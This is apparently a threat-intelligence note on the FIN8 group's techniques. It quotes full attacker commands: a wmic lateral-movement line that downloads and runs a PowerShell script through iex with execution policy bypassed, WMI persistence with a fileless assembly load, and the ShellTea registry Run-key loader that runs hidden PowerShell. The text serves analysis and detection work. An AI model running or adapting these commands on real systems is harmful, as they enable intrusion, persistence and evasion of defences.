# FIN8

## Features

1. Use WMI for remote command execution when lateral movement:wmic.exe /node:<target> process call create "cmd /c powershell.exe -nop -ep bypass -c $pw='b640a9c0e64704e1e202a07774613a29971fe5aa';$pa='sys';iex (New-Object System.Net.WebClient).DownloadString('https://Url/134af6')"，Where $pw is used to decrypt the downloaded script file，$pa is an impersonation token description，The process running svchost.exe - k netsvcs will be injected, and the file will be downloaded through IEX.

2. Create triggers through WMI to maintain persistence, using the command:cmd.exe /Q /c powershell.exe -nop -ep bypass -c C:\sldr.ps1 B4a0f3AE251b7689CFdDe1 1> \\127.0.0.1\ADMIN$\__1621898828.3311949 2>&1,Create three objects in WMI to ensure persistence.The sldr.ps1 script contains an RC4 encrypted string，B4a0f3AE251b7689CFdDe1 is the decrypted key.The second object created will be loaded into memory in a fileless format，and execute the static method through StartCheck():powershell.exe -nop -c [System.Reflection.Assembly]::Load(([WmiClass]'root\cimv2:Win32_Base64Class').Properties['Prop'].Value);[MSDAC.PerfOSChecker]::StartCheck().

3. ShellTea malware will appear in the registry HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run existence，and it will abuse wildcards to match software to reduce detection.

```bash
"C:\\Windows\\System32\\cmd.exe '/c' 'powershell.exe' '-w' '1' '-nop' '-c ' 'start-process powershell.exe -windowstyle hidden -arg '-nop -c $a=(Get-ItemProperty registry::HKCU\\S???ware\\Fpkakesude);IEX $a.Xshuzugewogazi ' '"
```
